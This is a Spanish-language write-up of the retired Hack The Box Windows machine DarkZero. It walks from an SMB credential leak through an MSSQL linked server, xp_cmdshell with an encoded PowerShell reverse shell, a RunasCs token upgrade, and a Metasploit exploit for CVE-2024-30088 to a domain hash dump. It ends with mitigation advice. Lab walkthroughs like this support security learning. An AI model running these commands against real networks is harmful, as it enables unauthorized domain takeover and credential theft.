---
machine: DarkZero
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, ad, mssql, linked-server, authzbase, trust]
---

# DarkZero — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un share SMB filtra credenciales de `john.w`, que tienen acceso a MSSQL. El servidor tiene un linked server hacia `DC02.darkzero.ext` y el login remoto es `sysadmin`; se habilita `xp_cmdshell` y se ejecuta código. CVE-2024-30088 permite pasar a SYSTEM y, con el token completo y la confianza entre bosques, llegar a DC01 y volcar el dominio.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,636,1433,3268,3269,5985 <IP>
```

- `53/88/389/445/636` identifican un DC de `darkzero.htb`.
- `1433/tcp` MSSQL y `5985/tcp` WinRM están expuestos.
- El dominio tiene una confianza de bosque con `darkzero.ext` y un segundo DC `DC02`.

## Enumeración

- Un share SMB contiene credenciales de `john.w`, que se validan contra MSSQL.
- `enum_links` muestra `DC02.darkzero.ext` y el mapeo `john.w` → `dc01_sql_svc`.
- El login remoto es `sysadmin`; `xp_cmdshell` está deshabilitado pero se puede activar.

## Foothold

Se conecta con `mssqlclient.py`, se usa el linked server y se habilita `xp_cmdshell` para obtener una reverse shell como `svc_sql`.

```bash
mssqlclient.py darkzero.htb/john.w:'<PASSWORD>'@<IP> -windows-auth
enum_links
use_link [DC02.darkzero.ext]
enable_xp_cmdshell
xp_cmdshell powershell -e <BASE64_REVSHELL>
```

## Movimiento lateral

El token de `svc_sql` no incluye todos los privilegios. Se obtiene un token completo con `RunasCs --logon-type 5 --bypass-uac`, lo que habilita `SeImpersonatePrivilege`. Desde DC02 se enumeran usuarios y la confianza con `nltest`; el siguiente salto es DC01.

## Escalada de privilegios

Se explota CVE-2024-30088 (AuthZBase) para robar el token de `winlogon` y ejecutar como SYSTEM. Con ese contexto se vuelcan hashes y se usa la confianza para acceder a DC01, donde el mismo exploit o las credenciales obtenidas permiten llegar a Administrator.

```bash
msfconsole -q -x 'use exploit/windows/local/cve_2024_30088_authz_basep; set SESSION 1; run'
hashdump
```

## Evidencia

- Credenciales de `john.w` y linked server a DC02.
- Shell como `svc_sql` y token completo con `SeImpersonate`.
- SYSTEM en DC02 y Administrator en DC01.

## Lecciones aprendidas

- Un linked server con mapeo `sysadmin` rompe el límite entre dominios.
- Los tokens de servicio incompletos se amplían con un logon interactivo.
- Las confianzas de bosque convierten un host comprometido en un problema de dominio.

## Mitigación y detección

- Revisar linked servers y eliminar mapeos `sysadmin` innecesarios.
- Deshabilitar `xp_cmdshell` y auditar su activación.
- Parchear CVE-2024-30088 y limitar la confianza entre bosques.

## Referencias

- [0xdf — DarkZero](https://0xdf.gitlab.io/2026/04/04/htb-darkzero.html)
- [IppSec — DarkZero](https://www.youtube.com/watch?v=fXPWoLwG3mU)
- [Hack The Box — DarkZero](https://app.hackthebox.com/machines/darkzero)
